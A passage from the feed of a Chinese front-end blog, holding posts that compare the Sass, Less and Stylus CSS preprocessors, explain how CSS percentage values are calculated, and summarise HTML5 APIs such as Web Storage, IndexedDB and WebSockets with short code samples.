class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.my-mixin &#123;</span><br><span class="line">  color: black;</span><br><span class="line">&#125;</span><br><span class="line">.class &#123;</span><br><span class="line">  color: black;</span><br><span class="line">  background: white;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Stylus-3"><a href="#Stylus-3" class="headerlink" title="Stylus"></a>Stylus</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">border-radius(n)</span><br><span class="line">  -webkit-border-radius n</span><br><span class="line">  -moz-border-radius n</span><br><span class="line">  border-radius n</span><br><span class="line">form input[type=button]</span><br><span class="line">  border-radius(5px)</span><br></pre></td></tr></table></figure><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">form input[type=button] &#123;</span><br><span class="line">  -webkit-border-radius: 5px;</span><br><span class="line">  -moz-border-radius: 5px;</span><br><span class="line">  border-radius: 5px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="import"><a href="#import" class="headerlink" title="@import"></a>@import</h3><p>三种语言基本一致。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;foo.css&quot;;</span><br><span class="line">@import &quot;foo&quot; screen;</span><br><span class="line">@import &quot;http://foo.com/bar&quot;;</span><br><span class="line">@import url(foo);</span><br></pre></td></tr></table></figure></p><p>Sass还提供一种分音。如果需要导入 SCSS 或者 Sass 文件，但又不希望将其编译为 CSS，只需要在文件名前添加下划线，这样会告诉 Sass 不要编译这些文件，但导入语句中却不需要添加下划线。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//将文件命名为 _colors.scss，便不会编译 _colours.css 文件。</span><br><span class="line">@import &quot;colors&quot;;</span><br></pre></td></tr></table></figure></p><h3 id="输出设置"><a href="#输出设置" class="headerlink" title="输出设置"></a>输出设置</h3><p>Sass 提供了四种输出格式，可以通过 :style option 选项设定，或者在命令行中使用 –style 选项。</p><ul><li>:nested：Nested （嵌套）样式，默认的输出格式。选择器与属性等单独占用一行，缩进量与 Sass 文件中一致，每行的缩进量反映了其在嵌套规则内的层数。</li><li>:expanded：输出更像是手写的样式，选择器、属性等各占用一行，属性根据选择器缩进，而选择器不做任何缩进。</li><li>:compact：每条 CSS 规则只占一行，包含其下的所有属性。嵌套过的选择器在输出时没有空行，不嵌套的选择器会输出空白行作为分隔符。</li><li>:compressed：删除所有无意义的空格、空白行、以及注释，力求将文件体积压缩到最小，同时也会做出其他调整，比如会自动替换占用空间最小的颜色表达方式。</li></ul><h3 id="控制指令"><a href="#控制指令" class="headerlink" title="控制指令"></a>控制指令</h3><h4 id="Sass-4"><a href="#Sass-4" class="headerlink" title="Sass"></a>Sass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$type: monster;</span><br><span class="line">p &#123;</span><br><span class="line">  @if $type == ocean &#123;</span><br><span class="line">    color: blue;</span><br><span class="line">  &#125; @else if $type == matador &#123;</span><br><span class="line">    color: red;</span><br><span class="line">  &#125; @else if $type == monster &#123;</span><br><span class="line">    color: green;</span><br><span class="line">  &#125; @else &#123;</span><br><span class="line">    color: black;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p &#123;</span><br><span class="line">  color: green; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less"></a>Less</h4><p>在1.5.0以前，使用 <code>when</code> 的语法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.my-optional-style() when (@my-option = true) &#123;</span><br><span class="line">  button &#123;</span><br><span class="line">    color: white;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">.my-optional-style();</span><br></pre></td></tr></table></figure></p><p>1.5.0以后也可以使用 <code>&amp; when</code> 的方式模拟 <code>if</code> 。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&amp; when (@my-option = true) &#123;</span><br><span class="line">  button &#123;</span><br><span class="line">    color: white;</span><br><span class="line">  &#125;</span><br><span class="line">  a &#123;</span><br><span class="line">    color: blue;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>也可以使用 <code>if</code> 。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@dr: if(@my-option = true, &#123;</span><br><span class="line">  button &#123;</span><br><span class="line">    color: white;</span><br><span class="line">  &#125;</span><br><span class="line">  a &#123;</span><br><span class="line">    color: blue;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">@dr();</span><br></pre></td></tr></table></figure></p><h4 id="Stylus-4"><a href="#Stylus-4" class="headerlink" title="Stylus"></a>Stylus</h4><p>更接近Sass。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">overload-padding = true</span><br><span class="line">if overload-padding</span><br><span class="line">  padding(y, x)</span><br><span class="line">    margin y x</span><br><span class="line">body</span><br><span class="line">  padding 5px 10px</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>Sass的优势得益于对函数和库的支持，但是因为基于Ruby环境，并不是特别友好。</li><li>Less相对清晰，也更接近CSS本身的写法，由于受Sass的极大的影响，我们也能看到，其中一些长期被开发者诟病的写法也得到了改善，对于Less的前景还是相对看好的。</li><li>Stylus可以说是集合了Sass和Less的优点，并进行极大的自由化，虽然目前Stylus的使用程度不如前两者广泛，但是鉴于其基于Node环境，语法大多参考Sass，在未来将是一个十分有生命力的CSS预处理器。</li></ul><blockquote><p>参考链接：<br><a href="https://zhuanlan.zhihu.com/p/23382462" target="_blank" rel="noopener">浅谈css预处理器，Sass、Less和Stylus-知乎</a><br><a href="https://juejin.im/post/5c9b17cbf265da60c95b7c3a" target="_blank" rel="noopener">关于sass（scss）、less、postcss、stylus等的用法与区别-掘金</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;俗话说得好，“人靠衣装，佛靠金装”，对于一个页面来说，美观与否，CSS起着重大的作用，而随着越来越多的使用，CSS也暴露出不少缺陷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;语法不够强大，比如无法嵌套书写导致模块化开发中需要书写很多重复的选择器&lt;/li&gt;
&lt;li&gt;没有变量和合理的样式复用机制，使得逻辑上相关的属性值必须以字面量的形式重复输出，导致难以维护&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;于是，CSS预处理器就诞生了。CSS预处理器用一种专门的编程语言，进行Web页面样式设计，然后再编译成正常的CSS文件，以供项目使用。CSS预处理器为CSS增加一些编程的特性，无需考虑浏览器的兼容性问题。&lt;br&gt;本文将主要介绍 Sass、Less 和 Stylus 这三种 css 预处理器，并比较分析他们的区别。&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="LESS" scheme="http://dangoying.ink/tags/LESS/"/>
    
      <category term="SASS" scheme="http://dangoying.ink/tags/SASS/"/>
    
      <category term="Stylus" scheme="http://dangoying.ink/tags/Stylus/"/>
    
  </entry>
  
  <entry>
    <title>CSS中的百分比计算</title>
    <link href="http://dangoying.ink/CSS%E4%B8%AD%E7%9A%84%E7%99%BE%E5%88%86%E6%AF%94%E8%AE%A1%E7%AE%97.html"/>
    <id>http://dangoying.ink/CSS中的百分比计算.html</id>
    <published>2019-08-27T14:10:30.000Z</published>
    <updated>2019-08-27T15:12:49.210Z</updated>
    
    <content type="html"><![CDATA[<p>CSS布局中会用到很多百分比，但他们究竟都是如何计算的呢，你可能一个不小心就会把他们混淆在一起，所以这里就对CSS中所有可以用到百分比的属性做一个总结，方便更加系统的理解和记忆。</p><a id="more"></a><h2 id="font-size"><a href="#font-size" class="headerlink" title="font-size"></a>font-size</h2><p>根据元素字体大小，当前大小为100%</p><h2 id="line-height"><a href="#line-height" class="headerlink" title="line-height"></a>line-height</h2><p>根据元素字体大小，当前大小为100%</p><h2 id="translate"><a href="#translate" class="headerlink" title="translate"></a>translate</h2><p>根据元素大小，当前大小为100%</p><h2 id="width"><a href="#width" class="headerlink" title="width"></a>width</h2><ul><li>正常文档流和浮动：百分比相对于父元素content-box</li><li>绝对定位：百分比相对于父元素padding-box</li></ul><h2 id="height"><a href="#height" class="headerlink" title="height"></a>height</h2><ul><li>正常文档流和浮动：百分比相对于父元素content-box</li><li>绝对定位：百分比相对于父元素padding-box</li><li>当父元素高度为auto：子元素高度百分比会被忽略</li></ul><h2 id="margin"><a href="#margin" class="headerlink" title="margin"></a>margin</h2><ul><li>正常文档流和浮动：百分比相对于父元素的content-box宽度</li><li>绝对定位：百分比相对于父元素的padding-box宽度</li></ul><h2 id="padding"><a href="#padding" class="headerlink" title="padding"></a>padding</h2><ul><li>正常文档流和浮动：百分比相对于父元素的content-box宽度</li><li>绝对定位：百分比相对于父元素的padding-box宽度</li></ul><h2 id="top-bottom-left-right"><a href="#top-bottom-left-right" class="headerlink" title="top/bottom/left/right"></a>top/bottom/left/right</h2><ul><li>非定位元素：无效果</li><li>相对定位： top和bottom百分比是相对父元素的content-box高度，left和right百分比是相对父元素的content-box宽度</li><li>绝对定位：top和bottom百分比是相对最近一级非static定位父元素的padding-box高度，left和right百分比是相对最近一级非static定位父元素的padding-box宽度</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CSS布局中会用到很多百分比，但他们究竟都是如何计算的呢，你可能一个不小心就会把他们混淆在一起，所以这里就对CSS中所有可以用到百分比的属性做一个总结，方便更加系统的理解和记忆。&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="CSS" scheme="http://dangoying.ink/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>HTML5知识点</title>
    <link href="http://dangoying.ink/HTML5%E7%9F%A5%E8%AF%86%E7%82%B9.html"/>
    <id>http://dangoying.ink/HTML5知识点.html</id>
    <published>2019-08-21T14:41:19.000Z</published>
    <updated>2019-08-25T05:59:08.197Z</updated>
    
    <content type="html"><![CDATA[<ul><li>最近阅读了HTML5权威指南，给HTML5中新增的知识点做了张思维导图，方便二次记忆和梳理。</li><li>针对其中部分知识点，已做举例补充。</li><li>有关Canvas部分的知识点不包括在内，将作为一个单独的专题进行梳理。<a id="more"></a></li></ul><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="../assets/20190821/html5.png" alt="Alt text"></p><h2 id="History-API"><a href="#History-API" class="headerlink" title="History API"></a>History API</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>用于在不刷新页面的前提下，通过脚本语言的方式来进行页面上某块局部内容的更新。</p><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history.pushState(state,null,&quot;edit.php?id=&quot;+id);</span><br></pre></td></tr></table></figure><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&quot;popstate&quot;,function(e)&#123;</span><br><span class="line">    if(e.state)</span><br><span class="line">    loadPage(e.state.userType,e.state.id);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h2><h3 id="Web-Storage"><a href="#Web-Storage" class="headerlink" title="Web Storage"></a>Web Storage</h3><h4 id="sessionStorage"><a href="#sessionStorage" class="headerlink" title="sessionStorage"></a>sessionStorage</h4><ul><li>解释：数据保存在session对象中。</li><li>方法：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//setItem()</span><br><span class="line">sessionStorage.setItem(&apos;key&apos;,&apos;value&apos;);</span><br><span class="line">//or</span><br><span class="line">sessionStorage.key = value;</span><br><span class="line"></span><br><span class="line">//getItem()</span><br><span class="line">var val = sessionStorage.getItem(&apos;key&apos;);</span><br><span class="line">//or</span><br><span class="line">var val = sessionStorage.key;</span><br></pre></td></tr></table></figure></li></ul><h4 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h4><ul><li>解释：数据保存在客户端本地的硬件设备中。</li><li>方法：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//setItem()</span><br><span class="line">localStorage.setItem(&apos;key&apos;,&apos;value&apos;);</span><br><span class="line">//or</span><br><span class="line">localStorage.key = value;</span><br><span class="line"></span><br><span class="line">//getItem()</span><br><span class="line">var val = localStorage.getItem(&apos;key&apos;);</span><br><span class="line">//or</span><br><span class="line">var val = localStorage.key;</span><br></pre></td></tr></table></figure></li></ul><h4 id="storage事件"><a href="#storage事件" class="headerlink" title="storage事件"></a>storage事件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&apos;storage&apos;,function(event)&#123;</span><br><span class="line">    //sessionStorage或localStorage的值发生变动时所要执行的处理</span><br><span class="line">&#125;,false);</span><br></pre></td></tr></table></figure><ul><li>event.key：在session或localStorage中被修改的数据键值</li><li>event.oldValue：在session或localStorage中被修改前的值</li><li>event.newValue：在session或localStorage中被修改后的值</li><li>event.url：修改session或localStorage的页面的URL地址</li><li>event.storageArea：改动的为session或localStorage</li></ul><h3 id="本地数据库"><a href="#本地数据库" class="headerlink" title="本地数据库"></a>本地数据库</h3><h4 id="SQLLite"><a href="#SQLLite" class="headerlink" title="SQLLite"></a>SQLLite</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var db = openDatabase(&apos;mydb&apos;,&apos;1.0&apos;,&apos;Test DB&apos;,2*1024*1024);</span><br><span class="line">db.transaction(function(tx)&#123;</span><br><span class="line">    tx.executeSql(&apos;INSET INTO MsgData VALUES(?,?,?)&apos;,[name,message,time],</span><br><span class="line">        function(tx,rs)&#123;&#125;,</span><br><span class="line">        function(tx,error)&#123;&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="indexedDB"><a href="#indexedDB" class="headerlink" title="indexedDB"></a>indexedDB</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">//兼容浏览器</span><br><span class="line">window.indexedDB = window.indexedDB || window.webkitIndexedDB || window.mozIndexedDB || window.msIndexedDB;</span><br><span class="line">window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction;</span><br><span class="line">window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange;</span><br><span class="line">window.IDBCursor = window.IDBCursor || window.webkitIDBCursor || window.msIDBCursor;</span><br><span class="line"></span><br><span class="line">//连接数据库</span><br><span class="line">var dbName = &apos;indexedDBTest&apos;;</span><br><span class="line">var dbVersion = 20190824;</span><br><span class="line">var idb;</span><br><span class="line">var dbConnect = indexedDB.open(dbName,dbVersion);</span><br><span class="line">dbConnect.onsuccess = function(e)&#123;</span><br><span class="line">    idb = e.target.result;</span><br><span class="line"></span><br><span class="line">    //开启事务</span><br><span class="line">    var tx = idb.transaction([&apos;Users&apos;],&quot;readwrite&quot;);</span><br><span class="line">    var store = tx.objectStore(&apos;User&apos;);</span><br><span class="line">    </span><br><span class="line">    //保存数据</span><br><span class="line">    var value = &#123;</span><br><span class="line">        userId:1,</span><br><span class="line">        userName: &apos;张三&apos;,</span><br><span class="line">        address: &apos;住址&apos;</span><br><span class="line">    &#125;;</span><br><span class="line">    var req = store.put(value);  //会覆盖</span><br><span class="line">    //or</span><br><span class="line">    var req = store.add(value);  //不会覆盖</span><br><span class="line">    req.oncomplete = function(e)&#123;&#125;;</span><br><span class="line">    req.onabort = function(e)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    //获取数据</span><br><span class="line">    var req = store.get(1);</span><br><span class="line">    var idx = store.index(&apos;userNameIndex&apos;);</span><br><span class="line">    var req = idx.get(&apos;张三&apos;);</span><br><span class="line"></span><br><span class="line">    //根据索引检索</span><br><span class="line">    var range = IDBKetRange.bound(&apos;用户A&apos;,&apos;用户D&apos;);</span><br><span class="line">    var direction = &quot;next&quot;;</span><br><span class="line">    var req = idx.openCursor(range,direction);</span><br><span class="line"></span><br><span class="line">    //统计对象数据数量</span><br><span class="line">    var req = store.count();</span><br><span class="line">&#125;</span><br><span class="line">dbConnect.onerror = function(e)&#123;</span><br><span class="line">&#125;</span><br><span class="line">dbConnect.onupgradeneeded = function(e)&#123;</span><br><span class="line">    idb = e.target.result;</span><br><span class="line">    </span><br><span class="line">    //创建仓库</span><br><span class="line">    var tx = e.target.transaction;</span><br><span class="line">    var name = &apos;User&apos;;</span><br><span class="line">    var optionalParameters = &#123;</span><br><span class="line">        keyPath: &apos;userId&apos;,</span><br><span class="line">        autoIncrement: false</span><br><span class="line">    &#125;;</span><br><span class="line">    var store = idb.createObjectStore(name,optionalParameters);</span><br><span class="line"></span><br><span class="line">    //创建索引</span><br><span class="line">    var name = &apos;userNameIndex&apos;;</span><br><span class="line">    var keyPath = &apos;userName&apos;;</span><br><span class="line">    var optionalParameters = &#123;</span><br><span class="line">        unique: false,</span><br><span class="line">        multiEntry: false</span><br><span class="line">    &#125;;</span><br><span class="line">    var idx = store.createIndex(name,keyPath,optionalParameters);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="离线存储"><a href="#离线存储" class="headerlink" title="离线存储"></a>离线存储</h2><h3 id="manifest文件"><a href="#manifest文件" class="headerlink" title="manifest文件"></a>manifest文件</h3><p>列举了需要被缓存或不需要被缓存的资源文件的名称，以及这些资源文件的访问路径。</p><h3 id="applicationCache对象"><a href="#applicationCache对象" class="headerlink" title="applicationCache对象"></a>applicationCache对象</h3><h4 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">applicationCache.onchecking = function(e)&#123;&#125;;</span><br><span class="line">applicationCache.onnoupdate = function(e)&#123;&#125;;</span><br><span class="line">applicationCache.ondownloading = function(e)&#123;&#125;;</span><br><span class="line">applicationCache.onprogress = function(e)&#123;&#125;;</span><br><span class="line">applicationCache.onUpdateReady = function(e)&#123;&#125;;</span><br><span class="line">applicationCache.oncached = function(e)&#123;&#125;;</span><br><span class="line">applicationCache.onerror = function(e)&#123;&#125;;</span><br></pre></td></tr></table></figure><h4 id="swapCache"><a href="#swapCache" class="headerlink" title="swapCache"></a>swapCache</h4><p>立即更新本地缓存。</p><h2 id="文件API"><a href="#文件API" class="headerlink" title="文件API"></a>文件API</h2><h3 id="FileList对象与file对象"><a href="#FileList对象与file对象" class="headerlink" title="FileList对象与file对象"></a>FileList对象与file对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var file;</span><br><span class="line">for(var i = 0;i&lt;document.geElementById(&quot;file&quot;).files.length;i++)&#123;</span><br><span class="line">    file = document.getElementById(&quot;file&quot;).files[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h3><p>用于二进制数据缓存字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var buf = new ArrayBuffer(32);</span><br></pre></td></tr></table></figure></p><h4 id="ArrayBufferView对象"><a href="#ArrayBufferView对象" class="headerlink" title="ArrayBufferView对象"></a>ArrayBufferView对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var Int32Array = new Int32Array(ArrayBuffer);</span><br></pre></td></tr></table></figure><h4 id="DataView对象"><a href="#DataView对象" class="headerlink" title="DataView对象"></a>DataView对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var view = new DataView((uffer,byteOffset,byteLength);</span><br></pre></td></tr></table></figure><h4 id="Blob对象"><a href="#Blob对象" class="headerlink" title="Blob对象"></a>Blob对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var blob = new Blob ([blobParts,type]);</span><br><span class="line">var newBlob = blob.slice(start,end,contentType);</span><br></pre></td></tr></table></figure><h3 id="FileReader对象"><a href="#FileReader对象" class="headerlink" title="FileReader对象"></a>FileReader对象</h3><p>用来把文件读入内存，并且读取文件中的数据。</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><ul><li>readAsText：以文本方式读取，读取的结果即这个文本文件中的内容</li><li>readAsBinaryString：读取为二进制字符串</li><li>readAsDataURL：读取一串Data URL字符串</li><li>readyArrayBuffer：读取为一个ArrayBuffer</li></ul><h4 id="事件-1"><a href="#事件-1" class="headerlink" title="事件"></a>事件</h4><ul><li>onabort()</li><li>onprogress()</li><li>onerror()</li><li>onload()</li><li>onloadstart()</li><li>onloadend()</li></ul><h3 id="FileSystem-API"><a href="#FileSystem-API" class="headerlink" title="FileSystem API"></a>FileSystem API</h3><p>用于用户需要永久保存数据，但是本地数据库的利用不能满足用户需求。</p><h4 id="适用场合"><a href="#适用场合" class="headerlink" title="适用场合"></a>适用场合</h4><ul><li>文件分段上传</li><li>在视频游戏或其他使用大量与媒体数据相关的应用程序中</li><li>在离线或使用本地缓存的音频编辑或图片编辑应用程序中</li><li>离线视频播放器</li><li>离线邮件客户端</li></ul><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><ul><li>请求访问文件系统：<br>window.requestFileSystem(type,size,successCallback,opt_errorCallback)</li><li>申请磁盘配额：<br>window.webkitStorageInfo.requestQuota(PERSISTENT,1024*1024,successHandler,errorHandler)</li><li>创建文件：<br>fs.root.getFile(filename,{create:true},successHandler,errorHandler)</li><li>写入文件：fileEntry.createWriter(successHandler,errorHandler)</li><li>在文件中追加数据：fileWriter.seek(fileWrer.length)</li><li>读取文件：fileEntry.file(successHandler,errorHandler)</li><li>复制磁盘中的文件：fileWriter.write(file);</li><li>删除文件：fileEntry.remove(successHandler,errorHandler)</li><li>创建目录：<br>fs.root.getDirectory(path,{create:true},successHandler,errorHandler)</li><li>读取目录中的内容：<br>fs.root.createReader().readEntries(successHandler,errorHandler)</li><li>删除目录：dirEntry.remove(successHandler,errorHandler)</li><li>复制文件或目录：<br>fileEntry.copyTo(parent,newName,successHandler,errorHandler)</li><li>移动文件或目录与重命名文件或目录：<br>fileEntry.moveTo(parent,newName,successHandler,errorHandler)</li></ul><h3 id="Base64编码支持"><a href="#Base64编码支持" class="headerlink" title="Base64编码支持"></a>Base64编码支持</h3><ul><li>理解为二进制：window.btoa</li><li>理解为ASCII码：window.atob</li></ul><h2 id="通信-API"><a href="#通信-API" class="headerlink" title="通信 API"></a>通信 API</h2><h3 id="跨文本信息传输"><a href="#跨文本信息传输" class="headerlink" title="跨文本信息传输"></a>跨文本信息传输</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&quot;message&quot;,function()&#123;...&#125;,false);</span><br><span class="line">otherWindow.postMessage(message,targetOrigin);</span><br></pre></td></tr></table></figure><h3 id="WebSockets"><a href="#WebSockets" class="headerlink" title="WebSockets"></a>WebSockets</h3><h4 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var webSocket = new WebSocket(&quot;ws://localhost:8005/socket&quot;);</span><br><span class="line">webSocket.send(&quot;data&quot;);</span><br><span class="line">webSocket.onmessage = function(event)&#123;&#125;;</span><br><span class="line">webSocket.onopen = function(event)&#123;&#125;;</span><br><span class="line">webSocket.onclose = function(event)&#123;&#125;;</span><br></pre></td></tr></table></figure><h4 id="发送对象"><a href="#发送对象" class="headerlink" title="发送对象"></a>发送对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webSocket.send(JSON.stringify(&#123;</span><br><span class="line">    result: successFlag,</span><br><span class="line">    time: currentTime</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><ul><li>多人在线游戏网站</li><li>聊天室</li><li>实时体育或新闻评论网站</li><li>实时交互用户信息的社交网站</li></ul><h3 id="Server-Sent-Events-API"><a href="#Server-Sent-Events-API" class="headerlink" title="Server-Sent Events API"></a>Server-Sent Events API</h3><h4 id="适用场景-1"><a href="#适用场景-1" class="headerlink" 